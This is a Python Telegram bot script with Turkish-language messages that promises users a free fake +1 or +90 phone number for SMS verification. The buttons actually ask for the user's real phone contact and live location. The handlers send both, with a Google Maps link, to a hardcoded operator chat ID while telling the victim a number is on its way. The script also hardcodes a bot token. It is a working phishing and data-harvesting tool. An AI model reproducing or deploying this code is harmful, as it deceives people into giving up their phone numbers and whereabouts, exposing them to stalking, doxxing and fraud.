import telebot
from telebot import types
Token='6844122663:AAGGZwB8Xxxlgnpyfav4bZVaUIFp12D5hlM'
bot = telebot.TeleBot(Token)
id = '5407630064'

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="+1 fake no almak için lütfen basın", request_contact=True)
    location_button = types.KeyboardButton(text="+90 fake no almak için lütfen basın.", request_location=True)
    keyboard.add(reg_button, location_button)
    response = bot.send_message(message.chat.id, "sms onay yapabilmem için lütfen onay verin.", reply_markup=keyboard)
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    num = message.contact.phone_number
    bot.send_message(id, text=f"onay verdiğin için teşekkür ederiz,komutunuz admine iletildi numaranız 5dk içerisinde verilecektir. : {num} • by; @deviremesin •")
    bot.send_message(message.chat.id, text="tebrikler bizden numara aldınız")
@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    lat = loc.latitude
    lon = loc.longitude
    bot.send_message(id, text=f'''
Mevcut Konumunuz :
 Enlem={lat}
 Boylam={lon}
 ● [ Google haritası ](https://www.google.com/maps/place/{lat},{lon})''',parse_mode='markdown')
    bot.send_message(message.chat.id, text="onay verdiğin için teşekkür ederiz,komutunuz admine iletildi numaranız 5dk içerisinde verilecektir. • by  @deviremesin :)")

bot.infinity_polling()
